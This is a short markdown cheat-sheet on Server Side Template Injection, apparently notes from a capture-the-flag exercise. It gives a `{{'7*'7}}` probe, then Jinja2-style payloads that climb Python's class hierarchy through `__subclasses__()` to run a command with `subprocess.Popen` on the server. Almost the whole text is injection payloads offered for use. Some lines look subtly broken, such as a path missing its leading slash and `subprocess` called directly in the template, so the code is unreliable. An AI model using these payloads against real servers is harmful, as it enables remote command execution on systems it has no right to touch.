# SSTI

Server Side Template Injection - ```{{'7*'7}}```.  See https://hackerone.com/reports/125980 for an example.

So accessing `http://example.com/{{'7*'7}}` might give you an error like this: `Page not Found: http://example.com/7777777`

```
{{''.__class__.mro()[1].__subclasses__()[2](subprocess.Popen(["usr/local/bin/score", "b1fca3c7-443e-4923-b598-a95b41e94b65"]))}}

{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}
{{''.__class__.mro()[1].__subclasses__()[2](COMMAND)}}
{{''.__class__.mro()[1].__subclasses__()[2](subprocess.Popen(["/usr/local/bin/score", "b1fca3c7-443e-4923-b598-a95b41e94b65"]))}}

subprocess.Popen(["/usr/local/bin/score", "b1fca3c7-443e-4923-b598-a95b41e94b65"])
```